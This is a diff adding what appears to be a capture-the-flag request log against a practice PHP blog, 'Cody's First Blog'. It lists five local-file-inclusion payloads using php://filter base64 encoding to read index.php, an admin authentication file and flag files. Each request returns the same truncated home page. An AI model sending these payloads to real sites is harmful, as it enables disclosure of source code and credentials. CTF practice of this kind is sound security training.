@@ -1,0 +1,60 @@
+=== /?page=php://filter/read=convert.base64-encode/resource=index.php ===
+<!doctype html>
+<html>
+	<head>
+		<title>Home -- Cody's First Blog</title>
+	</head>
+	<body>
+		<h1>Home</h1>
+		<p>Welcome to my blog!  I'm excited to share my thoughts with the world.  I have many important and controversial positions, which I hope to get across here.</p>
+
+	<h2>September 1, 2018 -- First</h2>
+	<p>First post!  I built this blog engine around one basic concept: PHP doesn't need a temp
+=== /?page=php://filter/convert.base64-encode/resource=posts/first.inc.php ===
+<!doctype html>
+<html>
+	<head>
+		<title>Home -- Cody's First Blog</title>
+	</head>
+	<body>
+		<h1>Home</h1>
+		<p>Welcome to my blog!  I'm excited to share my thoughts with the world.  I have many important and controversial positions, which I hope to get across here.</p>
+
+	<h2>September 1, 2018 -- First</h2>
+	<p>First post!  I built this blog engine around one basic concept: PHP doesn't need a temp
+=== /?page=php://filter/convert.base64-encode/resource=admin.auth.inc.php ===
+<!doctype html>
+<html>
+	<head>
+		<title>Home -- Cody's First Blog</title>
+	</head>
+	<body>
+		<h1>Home</h1>
+		<p>Welcome to my blog!  I'm excited to share my thoughts with the world.  I have many important and controversial positions, which I hope to get across here.</p>
+
+	<h2>September 1, 2018 -- First</h2>
+	<p>First post!  I built this blog engine around one basic concept: PHP doesn't need a temp
+=== /?page=php://filter/convert.base64-encode/resource=flag2 ===
+<!doctype html>
+<html>
+	<head>
+		<title>Home -- Cody's First Blog</title>
+	</head>
+	<body>
+		<h1>Home</h1>
+		<p>Welcome to my blog!  I'm excited to share my thoughts with the world.  I have many important and controversial positions, which I hope to get across here.</p>
+
+	<h2>September 1, 2018 -- First</h2>
+	<p>First post!  I built this blog engine around one basic concept: PHP doesn't need a temp
+=== /?page=php://filter/convert.base64-encode/resource=/flag2 ===
+<!doctype html>
+<html>
+	<head>
+		<title>Home -- Cody's First Blog</title>
+	</head>
+	<body>
+		<h1>Home</h1>
+		<p>Welcome to my blog!  I'm excited to share my thoughts with the world.  I have many important and controversial positions, which I hope to get across here.</p>
+
+	<h2>September 1, 2018 -- First</h2>
+	<p>First post!  I built this blog engine around one basic concept: PHP doesn't need a temp
